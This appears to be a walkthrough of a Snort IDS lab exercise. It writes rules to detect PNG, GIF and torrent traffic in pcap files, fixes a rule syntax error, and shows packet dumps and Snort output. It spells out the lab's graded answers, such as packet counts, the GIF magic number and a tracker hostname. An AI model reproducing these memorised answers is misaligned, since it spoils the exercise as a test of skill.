***AP*** Seq: 0x3D2348B0  Ack: 0x8C8DF67F  Win: 0xFAF0  TcpLen: 20
89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52  .PNG........IHDR
00 00 01 E0 00 00 01 E0 08 06 00 00 00 7D D4 BE  .............}..
95 00 00 00 19 74 45 58 74 53 6F 66 74 77 61 72  .....tEXtSoftwar
65 00 41 64 6F 62 65 20 49 6D 61 67 65 52 65 61  e.Adobe ImageRea
64 79 71 C9 65 3C 00 00 16 2E 49 44 41 54 78 DA  dyq.e<....IDATx.
EC DD 7F 88 65 57 61 07 F0 97 49 08 08 82 49 20  ....eWa...I...I 
10 10 B2 AE 28 0D 91 34 BB 58 5A 84 94 24 85 40  ....(..4.XZ..$.@
4A A4 71 4B C5 D2 62 4D F0 0F A9 34 98 08 85 8A  J.qK..bM...4....
85 D9 15 84 D2 52 B2 4B 0B 52 B1 64 53 A9 34 54  .....R.K.R.dS.4T
BA 89 18 2A 95 66 B3 18 2A 15 65 13 82 A1 42 60  ...*.f..*.e...B`
12 69 69 51 DA 64 41 08 08 32 3D DF 99 B9 9B B7  .iiQ.dA..2=.....
B3 F3 E3 CD B9 F7 DD 79 F7 DD CF 07 8E BB 6E 76  .......y......nv
66 77 CF 79 F7 7C EF 39 F7 DC 73 AE 59 5F 5F 9F  fw.y.|.9..s.Y__.
2C B8 77 97 F2 BE 52 7E A9 94 63 A5 1C 2D E5 E6  ,.w...R~..c..-..
AD FF F6 8E 52 6E 9F 00 30 46 6B A5 FC DF D6 CF  ....Rn..0Fk.....
DF 2A E5 95 52 5E 2E E5 D5 A9 B2 B0 AE 59 C0 00  .*..R^.......Y..
4E C8 DE 5F CA 5D A5 7C A8 94 9B 7C C6 00 A8 90  N.._.].|...|....
50 BE B0 55 9E 2B E5 7B 02 F8 6A 09 DA 8F 97 72  P..U.+.{..j....r
A2 94 5B 7C 66 00 98 83 4B A5 7C BB 94 AF 96 F2  ..[|f...K.|.....
6C 29 BF 18 6B 00 1F DD 0A DD 87 B6 7E 0E 00 7D  l)..k.......~..}
F9 69 29 4F 95 F2 B5 52 BE 3B 96 00 BE A3 94 3F  .i)O...R.;.....?
29 E5 F7 B4 3F 00 0B 20 01 FC 85 52 BE B5 AC 01  )...?.. ...R....
9C 69 E6 3F 9E 6C 4E 33 03 C0 A2 F9 41 29 5F 2C  .i.?.lN3....A)_,
E5 DC B2 04 70 56 30 FF B9 E0 05 60 20 5E 2C E5  ....pV0....` ^,.
91 52 5E 98 E7 1F B2 32 C7 EF 7D 7D 29 A7 4A F9  .R^....2..}}).J.
A1 F0 05 60 40 F2 36 CE 77 4A F9 BB C9 DB AF BD  ...`@.6.wJ......
0E 66 04 FC C1 52 FE 7E B2 F9 EE 2E 00 0C 55 DE  .f...R.~......U.
33 FE 54 29 5F 1F C2 08 F8 8F 4A F9 37 E1 0B C0  3.T)_.....J.7...
12 C8 5E 14 FF 58 CA DF 4C 36 37 7F 5A C8 11 F0  ..^..X..L67.Z...
BB B6 86 EB BF A5 BD 00 58 42 79 36 FC BB A5 FC  ........XBy6....
68 91 02 38 DB 41 7E 73 E2 7D 5E 00 96 DB CF 4A  h..8.A~s.}^....J
F9 FD 52 BE D1 F6 1B 75 31 05 9D D7 8B BE 23 7C  ..R....u1.....#|
01 18 81 77 96 F2 4F A5 7C F2 B0 03 F8 81 52 FE  ...w..O.|.....R.
75 62 BF 66 00 C6 E3 DA 52 BE 32 D9 DC DB E2 50  ub.f....R.2....P
02 F8 63 5B 77 01 EF D0 16 00 8C 50 F6 B8 F8 CB  ..c[w......P....
BE 03 38 0B AD B2 E0 EA 7A F5 0F C0 88 7D B6 94  ..8.....z....}..
CF D7 7C 61 CD 22 AC 5F 2D E5 79 23 5F 00 B8 EC  ..|a."._-.y#_...
D3 A5 7C 69 9E 01 7C C7 56 F8 7A E6 0B 00 6F CB  ..|i..|.V.z...o.
D1 86 1F 9D 1C 60 1F E9 83 04 70 42 F7 FB 13 AB  .....`....pB....
9D 01 60 27 3F 2F E5 D7 26 9B EF 0B EF EB 20 CF  ..`'?/..&..... .
80 9F 10 BE 00 B0 AB AC 8B FA 87 C9 E6 AB 4A 9D  ..............J.
05 70 B6 97 B4 C3 15 00 EC 2D DB 30 7F 65 96 DF  .p.......-.0.e..
38 CB 14 74 16 5D 7D 67 62 C5 33 00 CC 2A 07 38  8..t.]}gb.3..*.8
7C B9 4D 00 27 74 FF 7D B2 79 34 13 00 30 9B 6C  |.M.'t.}.y4..0.l
59 79 5B 29 FF B5 DB 6F D8 6F 0A FA B3 C2 17 00  Yy[)...o.o......
0E 2C CF 81 4F D7 8E 80 DF 5D CA 7F 4C 66 7C 98  .,..O....]..Lf|.
0C 00 5C E5 C3 A5 3C 7B D0 11 F0 69 E1 0B 00 AD  ..\...<{...i....
24 4B AF 3F 48 00 67 E1 D5 EF A8 37 00 68 E5 7D  $K.?H.g....7.h.}
A5 FC E1 4E FF 61 B7 29 E8 9C ED FB 80 7A 03 80  ...N.a.).....z..
D6 B2 10 EB BD 93 CD 8D 3A F6 1C 01 1F 13 BE 00  ........:.......
D0 99 AC A9 BA EA FC E0 9D 02 F8 F3 EA 0A 00 3A  ...............:
95 B3 83 AF DD 2B 80 33 57 7D 42 3D 01 40 A7 B2  .....+.3W}B=.@..
95 F3 C7 F6 0A E0 4F 6E 4F 68 00 A0 13 57 4C 43  ......OnOh...WLC
4F 2F C2 4A F0 FE 67 29 B7 A8 23 00 98 8B F7 97  O/.J..g)..#.....
F2 EA F6 11 F0 6F 08 5F 00 98 AB CB D3 D0 2B 3B  .....o._......+;
FD 22 00 30 DF 00 6E A6 A0 33 FD FC 93 52 6E 52  .".0..n..3...RnR
37 00 30 57 47 4A F9 71 33 02 BE 5D F8 02 40 2F  7.0WGJ.q3..]..@/
F2 C8 F7 F2 14 B4 8D 37 00 A0 1F F7 4D 07 F0 5D  .......7....M..]
EA 03 00 7A B1 91 B9 CD 33 E0 FF 9D 98 82 06 80  ...z....3.......
BE DC 96 11 F0 51 E1 0B 00 BD 3A 96 00 BE 43 3D  .....Q....:...C=
00 40 FF 01 7C BB 7A 00 80 5E DD DE 4C 41 03 00  .@..|.z..^..LA..
FD B9 35 01 7C AB 7A 00 80 5E 1D 4D 00 DF AC 1E  ..5.|.z..^.M....
00 A0 57 EF 4A 00 5B 01 0D 00 3D 13 C0 00 70 48  ..W.J.[...=...pH
01 7C BD 6A 00 80 7E 65 27 AC 75 D5 00 00 FD 8F  .|.j..~e'.u.....
80 01 00 01 0C 00 02 18 00 10 C0 00 20 80 01 00  ............ ...
01 0C 00 02 18 00 10 C0 00 20 80 01 40 00 AB 02  ......... ..@...
00 10 C0 00 20 80 01 00 01 0C 00 02 18 00 10 C0  .... ...........
00 20 80 01 00 01 0C 00 02 18 00 10 C0 00 20 80  . ............ .
01 40 00 03 00 02 18 00 04 30 00 20 80 01 40 00  .@.......0. ..@.
03 00 02 18 00 04 30 00 20 80 01 40 00 03 80 00  ......0. ..@....
06 00 04 30 00 08 60 00 40 00 03 80 00 06        ...0..`.@.....

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

===============================================================================
Run time for packet processing was 0.253 seconds
Snort processed 1 packets.
Snort ran for 0 days 0 hours 0 minutes 0 seconds
   Pkts/sec:            1
===============================================================================
Memory usage summary:
  Total non-mmapped bytes (arena):       786432
  Bytes in mapped regions (hblkhd):      13180928
  Total allocated space (uordblks):      678144
  Total free space (fordblks):           108288
  Topmost releasable block (keepcost):   102304
===============================================================================
Packet I/O Totals:
   Received:            1
   Analyzed:            1 (100.000%)
    Dropped:            0 (  0.000%)
   Filtered:            0 (  0.000%)
Outstanding:            0 (  0.000%)
   Injected:            0
===============================================================================
Breakdown by protocol (includes rebuilt packets):
        Eth:            1 (100.000%)
       VLAN:            0 (  0.000%)
        IP4:            1 (100.000%)
       Frag:            0 (  0.000%)
       ICMP:            0 (  0.000%)
        UDP:            0 (  0.000%)
        TCP:            1 (100.000%)
        IP6:            0 (  0.000%)
    IP6 Ext:            0 (  0.000%)
   IP6 Opts:            0 (  0.000%)
      Frag6:            0 (  0.000%)
      ICMP6:            0 (  0.000%)
       UDP6:            0 (  0.000%)
       TCP6:            0 (  0.000%)
     Teredo:            0 (  0.000%)
    ICMP-IP:            0 (  0.000%)
    IP4/IP4:            0 (  0.000%)
    IP4/IP6:            0 (  0.000%)
    IP6/IP4:            0 (  0.000%)
    IP6/IP6:            0 (  0.000%)
        GRE:            0 (  0.000%)
    GRE Eth:            0 (  0.000%)
   GRE VLAN:            0 (  0.000%)
    GRE IP4:            0 (  0.000%)
    GRE IP6:            0 (  0.000%)
GRE IP6 Ext:            0 (  0.000%)
   GRE PPTP:            0 (  0.000%)
    GRE ARP:            0 (  0.000%)
    GRE IPX:            0 (  0.000%)
   GRE Loop:            0 (  0.000%)
       MPLS:            0 (  0.000%)
        ARP:            0 (  0.000%)
        IPX:            0 (  0.000%)
   Eth Loop:            0 (  0.000%)
   Eth Disc:            0 (  0.000%)
   IP4 Disc:            0 (  0.000%)
   IP6 Disc:            0 (  0.000%)
   TCP Disc:            0 (  0.000%)
   UDP Disc:            0 (  0.000%)
  ICMP Disc:            0 (  0.000%)
All Discard:            0 (  0.000%)
      Other:            0 (  0.000%)
Bad Chk Sum:            0 (  0.000%)
    Bad TTL:            0 (  0.000%)
     S5 G 1:            0 (  0.000%)
     S5 G 2:            0 (  0.000%)
      Total:            1
===============================================================================
Snort exiting

```

*Adobe ImageRead*



Clear the previous log and alarm files.

Deactivate/comment on the old rule.

Write a rule to detect the GIF file in the given pcap.

Investigate the logs and identify the image format embedded in the packet.
Check for the MIME type/Magic Number.

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-4 (PNG)# rm -r snort.log.1670376065 
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-4 (PNG)# nano local.rules 
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-4 (PNG)# cat local.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

#alert icmp any any <> any any  (msg: "ICMP Packet Found"; sid: 100001; rev:1;)
#alert tcp any any <> any any (msg: "PNG Found";content:"PNG";sid:100001;rev:1;)
alert tcp any any <> any any (msg: "GIF Found";content:"GIF";sid:100001;rev:1;)

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-4 (PNG)# sudo snort -c local.rules -A console -dev -l . -r ftp-png-gif.pcap 

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-4 (PNG)# sudo snort -r snort.log.1670376656 -dev
Running in packet dump mode

        --== Initializing Snort ==--
Initializing Output Plugins!
pcap DAQ configured to read-file.
Acquiring network traffic from "snort.log.1670376656".

        --== Initialization Complete ==--

   ,,_     -*> Snort! <*-
  o"  )~   Version 2.9.7.0 GRE (Build 149) 
   ''''    By Martin Roesch & The Snort Team: http://www.snort.org/contact#team
           Copyright (C) 2014 Cisco and/or its affiliates. All rights reserved.
           Copyright (C) 1998-2013 Sourcefire, Inc., et al.
           Using libpcap version 1.9.1 (with TPACKET_V3)
           Using PCRE version: 8.39 2016-06-14
           Using ZLIB version: 1.2.11

Commencing packet processing (pid=5865)
WARNING: No preprocessors configured for policy 0.
01/05-20:15:46.525001 00:50:56:FD:2F:16 -> 00:0C:29:1D:B3:B1 type:0x800 len:0x61
77.72.118.168:80 -> 192.168.47.171:2738 TCP TTL:128 TOS:0x0 ID:63078 IpLen:20 DgmLen:83
***AP**F Seq: 0x11976E7A  Ack: 0xC8BE2DE7  Win: 0xFAF0  TcpLen: 20
47 49 46 38 39 61 01 00 01 00 80 00 00 FF FF FF  GIF89a..........
00 00 00 21 F9 04 01 00 00 00 00 2C 00 00 00 00  ...!.......,....
01 00 01 00 00 02 02 44 01 00 3B                 .......D..;

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
01/05-20:15:46.682236 00:50:56:FD:2F:16 -> 00:0C:29:1D:B3:B1 type:0x800 len:0x61
77.72.118.168:80 -> 192.168.47.171:2739 TCP TTL:128 TOS:0x0 ID:63085 IpLen:20 DgmLen:83
***AP**F Seq: 0x32A2AF7  Ack: 0xC4B5FD53  Win: 0xFAF0  TcpLen: 20
47 49 46 38 39 61 01 00 01 00 80 00 00 FF FF FF  GIF89a..........
00 00 00 21 F9 04 01 00 00 00 00 2C 00 00 00 00  ...!.......,....
01 00 01 00 00 02 02 44 01 00 3B                 .......D..;

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
01/05-20:15:46.691761 00:50:56:FD:2F:16 -> 00:0C:29:1D:B3:B1 type:0x800 len:0x61
77.72.118.168:80 -> 192.168.47.171:2740 TCP TTL:128 TOS:0x0 ID:63089 IpLen:20 DgmLen:83
***AP**F Seq: 0x142B362E  Ack: 0xD36AF6ED  Win: 0xFAF0  TcpLen: 20
47 49 46 38 39 61 01 00 01 00 80 00 00 FF FF FF  GIF89a..........
00 00 00 21 F9 04 01 00 00 00 00 2C 00 00 00 00  ...!.......,....
01 00 01 00 00 02 02 44 01 00 3B                 .......D..;

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
01/05-20:15:46.771530 00:50:56:FD:2F:16 -> 00:0C:29:1D:B3:B1 type:0x800 len:0x61
77.72.118.168:80 -> 192.168.47.171:2741 TCP TTL:128 TOS:0x0 ID:63093 IpLen:20 DgmLen:83
***AP**F Seq: 0x2FC56F3  Ack: 0xA6C502A7  Win: 0xFAF0  TcpLen: 20
47 49 46 38 39 61 01 00 01 00 80 00 00 FF FF FF  GIF89a..........
00 00 00 21 F9 04 01 00 00 00 00 2C 00 00 00 00  ...!.......,....
01 00 01 00 00 02 02 44 01 00 3B                 .......D..;

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

===============================================================================
Run time for packet processing was 0.206 seconds
Snort processed 4 packets.
Snort ran for 0 days 0 hours 0 minutes 0 seconds
   Pkts/sec:            4
===============================================================================
Memory usage summary:
  Total non-mmapped bytes (arena):       786432
  Bytes in mapped regions (hblkhd):      13180928
  Total allocated space (uordblks):      678144
  Total free space (fordblks):           108288
  Topmost releasable block (keepcost):   102304
===============================================================================
Packet I/O Totals:
   Received:            4
   Analyzed:            4 (100.000%)
    Dropped:            0 (  0.000%)
   Filtered:            0 (  0.000%)
Outstanding:            0 (  0.000%)
   Injected:            0
===============================================================================
Breakdown by protocol (includes rebuilt packets):
        Eth:            4 (100.000%)
       VLAN:            0 (  0.000%)
        IP4:            4 (100.000%)
       Frag:            0 (  0.000%)
       ICMP:            0 (  0.000%)
        UDP:            0 (  0.000%)
        TCP:            4 (100.000%)
        IP6:            0 (  0.000%)
    IP6 Ext:            0 (  0.000%)
   IP6 Opts:            0 (  0.000%)
      Frag6:            0 (  0.000%)
      ICMP6:            0 (  0.000%)
       UDP6:            0 (  0.000%)
       TCP6:            0 (  0.000%)
     Teredo:            0 (  0.000%)
    ICMP-IP:            0 (  0.000%)
    IP4/IP4:            0 (  0.000%)
    IP4/IP6:            0 (  0.000%)
    IP6/IP4:            0 (  0.000%)
    IP6/IP6:            0 (  0.000%)
        GRE:            0 (  0.000%)
    GRE Eth:            0 (  0.000%)
   GRE VLAN:            0 (  0.000%)
    GRE IP4:            0 (  0.000%)
    GRE IP6:            0 (  0.000%)
GRE IP6 Ext:            0 (  0.000%)
   GRE PPTP:            0 (  0.000%)
    GRE ARP:            0 (  0.000%)
    GRE IPX:            0 (  0.000%)
   GRE Loop:            0 (  0.000%)
       MPLS:            0 (  0.000%)
        ARP:            0 (  0.000%)
        IPX:            0 (  0.000%)
   Eth Loop:            0 (  0.000%)
   Eth Disc:            0 (  0.000%)
   IP4 Disc:            0 (  0.000%)
   IP6 Disc:            0 (  0.000%)
   TCP Disc:            0 (  0.000%)
   UDP Disc:            0 (  0.000%)
  ICMP Disc:            0 (  0.000%)
All Discard:            0 (  0.000%)
      Other:            0 (  0.000%)
Bad Chk Sum:            0 (  0.000%)
    Bad TTL:            0 (  0.000%)
     S5 G 1:            0 (  0.000%)
     S5 G 2:            0 (  0.000%)
      Total:            4
===============================================================================
Snort exiting


```

*GIF89a*

### Writing IDS Rules (Torrent Metafile) 

Let's create IDS Rules for torrent metafiles in the traffic!



Navigate to the task folder.

Use the given pcap file.

Write a rule to detect the torrent metafile in the given pcap.

 What is the number of detected packets?

Torrent metafiles have a common name extension (.torrent). Try to filter the given pattern in the TCP traffic.

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-4 (PNG)# cd ..
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files# ls
 Config-Samples  'TASK-3 (FTP)'  'TASK-5 (TorrentMetafile)'  'TASK-7 (MS17-10)'
'TASK-2 (HTTP)'  'TASK-4 (PNG)'  'TASK-6 (Troubleshooting)'  'TASK-8 (Log4j)'
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files# cd 'TASK-5 (TorrentMetafile)'/
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)# ls
local.rules  torrent.pcap
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)# nano local.rules 
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)# cat local.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any any <> any any (msg:"Torrent is Here";content:".torrent";sid:100001;rev:1;)

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)# sudo snort -c local.rules -A console -dev -l . -r torrent.pcap 

Action Stats:
     Alerts:            2 (  3.571%)
     Logged:            2 (  3.571%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            0
      Alert:            0
Verdicts:
      Allow:           56 (100.000%)
      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
Snort exiting


```


*2*


Investigate the log/alarm files.

What is the name of the torrent application?

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)# sudo snort -r snort.log.1670377922 -dev

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)# ls
local.rules  snort.log.1670377922  torrent.pcap
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)# sudo snort -r snort.log.1670377922 -dev
Running in packet dump mode

        --== Initializing Snort ==--
Initializing Output Plugins!
pcap DAQ configured to read-file.
Acquiring network traffic from "snort.log.1670377922".

        --== Initialization Complete ==--

   ,,_     -*> Snort! <*-
  o"  )~   Version 2.9.7.0 GRE (Build 149) 
   ''''    By Martin Roesch & The Snort Team: http://www.snort.org/contact#team
           Copyright (C) 2014 Cisco and/or its affiliates. All rights reserved.
           Copyright (C) 1998-2013 Sourcefire, Inc., et al.
           Using libpcap version 1.9.1 (with TPACKET_V3)
           Using PCRE version: 8.39 2016-06-14
           Using ZLIB version: 1.2.11

Commencing packet processing (pid=5912)
WARNING: No preprocessors configured for policy 0.
07/03-07:54:06.930000 00:00:01:00:00:00 -> BC:DF:20:00:01:00 type:0x800 len:0x1A2
213.122.214.127:3868 -> 69.44.153.178:2710 TCP TTL:128 TOS:0x0 ID:21834 IpLen:20 DgmLen:404 DF
***AP*** Seq: 0xE9A59016  Ack: 0xED0BC172  Win: 0x2238  TcpLen: 20
47 45 54 20 2F 61 6E 6E 6F 75 6E 63 65 3F 69 6E  GET /announce?in
66 6F 5F 68 61 73 68 3D 25 30 31 64 25 46 45 25  fo_hash=%01d%FE%
37 45 25 46 31 25 31 30 25 35 43 57 76 41 70 25  7E%F1%10%5CWvAp%
45 44 25 46 36 25 30 33 25 43 34 39 25 44 36 42  ED%F6%03%C49%D6B
25 31 34 25 46 31 26 70 65 65 72 5F 69 64 3D 25  %14%F1&peer_id=%
42 38 6A 73 25 37 46 25 45 38 25 30 43 25 41 46  B8js%7F%E8%0C%AF
68 25 30 32 59 25 39 36 37 25 32 34 65 25 32 37  h%02Y%967%24e%27
56 25 45 45 4D 25 31 36 25 35 42 26 70 6F 72 74  V%EEM%16%5B&port
3D 34 31 37 33 30 26 75 70 6C 6F 61 64 65 64 3D  =41730&uploaded=
30 26 64 6F 77 6E 6C 6F 61 64 65 64 3D 30 26 6C  0&downloaded=0&l
65 66 74 3D 33 37 36 37 38 36 39 26 63 6F 6D 70  eft=3767869&comp
61 63 74 3D 31 26 69 70 3D 31 32 37 2E 30 2E 30  act=1&ip=127.0.0
2E 31 26 65 76 65 6E 74 3D 73 74 61 72 74 65 64  .1&event=started
20 48 54 54 50 2F 31 2E 31 0D 0A 41 63 63 65 70   HTTP/1.1..Accep
74 3A 20 61 70 70 6C 69 63 61 74 69 6F 6E 2F 78  t: application/x
2D 62 69 74 74 6F 72 72 65 6E 74 0D 0A 41 63 63  -bittorrent..Acc
65 70 74 2D 45 6E 63 6F 64 69 6E 67 3A 20 67 7A  ept-Encoding: gz
69 70 0D 0A 55 73 65 72 2D 41 67 65 6E 74 3A 20  ip..User-Agent: 
52 41 5A 41 20 32 2E 31 2E 30 2E 30 0D 0A 48 6F  RAZA 2.1.0.0..Ho
73 74 3A 20 74 72 61 63 6B 65 72 32 2E 74 6F 72  st: tracker2.tor
72 65 6E 74 62 6F 78 2E 63 6F 6D 3A 32 37 31 30  rentbox.com:2710
0D 0A 43 6F 6E 6E 65 63 74 69 6F 6E 3A 20 4B 65  ..Connection: Ke
65 70 2D 41 6C 69 76 65 0D 0A 0D 0A              ep-Alive....

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
07/03-07:54:42.551000 00:00:01:00:00:00 -> BC:DF:20:00:01:00 type:0x800 len:0x194
213.122.214.127:3904 -> 69.44.153.178:2710 TCP TTL:128 TOS:0x0 ID:22748 IpLen:20 DgmLen:390 DF
***AP*** Seq: 0xEA47AA16  Ack: 0xEE93DF8E  Win: 0x2238  TcpLen: 20
47 45 54 20 2F 61 6E 6E 6F 75 6E 63 65 3F 69 6E  GET /announce?in
66 6F 5F 68 61 73 68 3D 25 30 31 64 25 46 45 25  fo_hash=%01d%FE%
37 45 25 46 31 25 31 30 25 35 43 57 76 41 70 25  7E%F1%10%5CWvAp%
45 44 25 46 36 25 30 33 25 43 34 39 25 44 36 42  ED%F6%03%C49%D6B
25 31 34 25 46 31 26 70 65 65 72 5F 69 64 3D 25  %14%F1&peer_id=%
42 38 6A 73 25 37 46 25 45 38 25 30 43 25 41 46  B8js%7F%E8%0C%AF
68 25 30 32 59 25 39 36 37 25 32 34 65 25 32 37  h%02Y%967%24e%27
56 25 45 45 4D 25 31 36 25 35 42 26 70 6F 72 74  V%EEM%16%5B&port
3D 34 31 37 33 30 26 75 70 6C 6F 61 64 65 64 3D  =41730&uploaded=
30 26 64 6F 77 6E 6C 6F 61 64 65 64 3D 30 26 6C  0&downloaded=0&l
65 66 74 3D 33 37 36 37 38 36 39 26 63 6F 6D 70  eft=3767869&comp
61 63 74 3D 31 26 69 70 3D 31 32 37 2E 30 2E 30  act=1&ip=127.0.0
2E 31 20 48 54 54 50 2F 31 2E 31 0D 0A 41 63 63  .1 HTTP/1.1..Acc
65 70 74 3A 20 61 70 70 6C 69 63 61 74 69 6F 6E  ept: application
2F 78 2D 62 69 74 74 6F 72 72 65 6E 74 0D 0A 41  /x-bittorrent..A
63 63 65 70 74 2D 45 6E 63 6F 64 69 6E 67 3A 20  ccept-Encoding: 
67 7A 69 70 0D 0A 55 73 65 72 2D 41 67 65 6E 74  gzip..User-Agent
3A 20 52 41 5A 41 20 32 2E 31 2E 30 2E 30 0D 0A  : RAZA 2.1.0.0..
48 6F 73 74 3A 20 74 72 61 63 6B 65 72 32 2E 74  Host: tracker2.t
6F 72 72 65 6E 74 62 6F 78 2E 63 6F 6D 3A 32 37  orrentbox.com:27
31 30 0D 0A 43 6F 6E 6E 65 63 74 69 6F 6E 3A 20  10..Connection: 
4B 65 65 70 2D 41 6C 69 76 65 0D 0A 0D 0A        Keep-Alive....

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

===============================================================================
Run time for packet processing was 0.283 seconds
Snort processed 2 packets.
Snort ran for 0 days 0 hours 0 minutes 0 seconds
   Pkts/sec:            2
===============================================================================
Memory usage summary:
  Total non-mmapped bytes (arena):       786432
  Bytes in mapped regions (hblkhd):      13180928
  Total allocated space (uordblks):      678144
  Total free space (fordblks):           108288
  Topmost releasable block (keepcost):   102304
===============================================================================
Packet I/O Totals:
   Received:            2
   Analyzed:            2 (100.000%)
    Dropped:            0 (  0.000%)
   Filtered:            0 (  0.000%)
Outstanding:            0 (  0.000%)
   Injected:            0
===============================================================================
Breakdown by protocol (includes rebuilt packets):
        Eth:            2 (100.000%)
       VLAN:            0 (  0.000%)
        IP4:            2 (100.000%)
       Frag:            0 (  0.000%)
       ICMP:            0 (  0.000%)
        UDP:            0 (  0.000%)
        TCP:            2 (100.000%)
        IP6:            0 (  0.000%)
    IP6 Ext:            0 (  0.000%)
   IP6 Opts:            0 (  0.000%)
      Frag6:            0 (  0.000%)
      ICMP6:            0 (  0.000%)
       UDP6:            0 (  0.000%)
       TCP6:            0 (  0.000%)
     Teredo:            0 (  0.000%)
    ICMP-IP:            0 (  0.000%)
    IP4/IP4:            0 (  0.000%)
    IP4/IP6:            0 (  0.000%)
    IP6/IP4:            0 (  0.000%)
    IP6/IP6:            0 (  0.000%)
        GRE:            0 (  0.000%)
    GRE Eth:            0 (  0.000%)
   GRE VLAN:            0 (  0.000%)
    GRE IP4:            0 (  0.000%)
    GRE IP6:            0 (  0.000%)
GRE IP6 Ext:            0 (  0.000%)
   GRE PPTP:            0 (  0.000%)
    GRE ARP:            0 (  0.000%)
    GRE IPX:            0 (  0.000%)
   GRE Loop:            0 (  0.000%)
       MPLS:            0 (  0.000%)
        ARP:            0 (  0.000%)
        IPX:            0 (  0.000%)
   Eth Loop:            0 (  0.000%)
   Eth Disc:            0 (  0.000%)
   IP4 Disc:            0 (  0.000%)
   IP6 Disc:            0 (  0.000%)
   TCP Disc:            0 (  0.000%)
   UDP Disc:            0 (  0.000%)
  ICMP Disc:            0 (  0.000%)
All Discard:            0 (  0.000%)
      Other:            0 (  0.000%)
Bad Chk Sum:            0 (  0.000%)
    Bad TTL:            0 (  0.000%)
     S5 G 1:            0 (  0.000%)
     S5 G 2:            0 (  0.000%)
      Total:            2
===============================================================================
Snort exiting

tracker2.torrentbox.com


```

*bittorrent*


Investigate the log/alarm files.

What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?
*application/x-bittorrent*


Investigate the log/alarm files.

What is the hostname of the torrent metafile?
*tracker2.torrentbox.com*

### Troubleshooting Rule Syntax Errors 

Let's troubleshoot rule syntax errors!



In this section, you need to fix the syntax errors in the given rule files. 

You can test each ruleset with the following command structure;

sudo snort -c local-X.rules -r mx-1.pcap -A console

Fix the syntax error in local-1.rules file and make it work smoothly.

What is the number of the detected packets?
Spaces matters!

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files# ls
 Config-Samples  'TASK-3 (FTP)'  'TASK-5 (TorrentMetafile)'  'TASK-7 (MS17-10)'
'TASK-2 (HTTP)'  'TASK-4 (PNG)'  'TASK-6 (Troubleshooting)'  'TASK-8 (Log4j)'
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files# cd 'TASK-6 (Troubleshooting)'/
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# ls
local-1.rules  local-3.rules  local-5.rules  local-7.rules
local-2.rules  local-4.rules  local-6.rules  mx-1.pcap

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# cat local-1.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

alert tcp any 3372 -> any any(msg: "Troubleshooting 1"; sid:1000001; rev:1;)

--repair--

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# cat local-1.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

alert tcp any 3372 -> any any (msg:"Troubleshooting 1"; sid:1000001; rev:1;)

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# sudo snort -c local-1.rules -r mx-1.pcap -A console

===============================================================================
Action Stats:
     Alerts:           16 ( 13.913%)
     Logged:           16 ( 13.913%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            0
      Alert:            0
Verdicts:
      Allow:          115 (100.000%)
